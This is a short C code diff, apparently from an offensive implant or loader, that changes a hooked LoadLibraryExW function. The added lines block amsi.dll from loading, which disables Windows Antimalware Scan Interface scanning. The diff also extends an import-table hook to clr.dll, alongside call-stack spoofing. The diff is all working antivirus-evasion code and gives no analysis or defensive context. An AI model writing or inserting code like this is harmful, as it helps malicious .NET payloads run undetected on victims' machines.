@@ -630,6 +630,19 @@ HMODULE WINAPI _LoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlag
     dprintf(" -> dwFlags       : %d\n", dwFlags);
     #endif
 
+    /* get name of dll being loaded */
+    LPCWSTR back = MSVCRT$wcsrchr(lpLibFileName, L'\\');
+    LPCWSTR fwd  = MSVCRT$wcsrchr(lpLibFileName, L'/');
+    LPCWSTR name = back > fwd ? back : fwd;
+    
+    if (name) { name++; }        
+    else { name = lpLibFileName; }
+
+    if (MSVCRT$_wcsicmp(name, L"amsi.dll") == 0) {
+        /* return without loading (─ ‿ ─) */
+        return NULL;
+    }
+
     /* spoof the call */
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
@@ -643,15 +656,8 @@ HMODULE WINAPI _LoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlag
     /* hold the result */
     HMODULE result = (HMODULE)draugr(&call);
 
-    /* check to see if it's mscoreei.dll */
-    LPCWSTR back = MSVCRT$wcsrchr(lpLibFileName, L'\\');
-    LPCWSTR fwd  = MSVCRT$wcsrchr(lpLibFileName, L'/');
-    LPCWSTR name = back > fwd ? back : fwd;
-    
-    if (name) { name++; }        
-    else { name = lpLibFileName; }
-
-    if (MSVCRT$_wcsicmp(name, L"mscoreei.dll") == 0)
+    /* check to see if it's mscoreei.dll or clr.dll */
+    if (MSVCRT$_wcsicmp(name, L"mscoreei.dll") == 0 || MSVCRT$_wcsicmp(name, L"clr.dll") == 0)
     {
         /* walk the IAT and hook LoadLibraryExW */
         PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)result;
